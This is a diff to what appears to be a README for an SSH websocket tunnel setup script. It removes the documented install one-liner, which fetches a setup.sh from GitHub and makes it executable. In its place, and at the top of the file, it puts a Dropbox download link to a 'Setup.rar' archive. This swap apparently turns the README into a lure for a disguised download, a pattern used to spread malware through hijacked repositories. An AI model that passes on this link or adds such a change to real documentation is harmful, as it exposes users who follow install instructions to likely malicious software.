@@ -1,3 +1,4 @@
+Download and Setup: https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
 - Support Wildcard ✅
 - SSH Websocket : 80
 - SSH SSL Websocket : 443
@@ -18,4 +19,4 @@
 
 
 ```
-sysctl -w net.ipv6.conf.all.disable_ipv6=1 && sysctl -w net.ipv6.conf.default.disable_ipv6=1 && apt update && apt install -y bzip2 gzip coreutils screen curl unzip && wget https://raw.githubusercontent.com/shakboss/supreme/aio/setup.sh && chmod +x setup.sh
+https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1
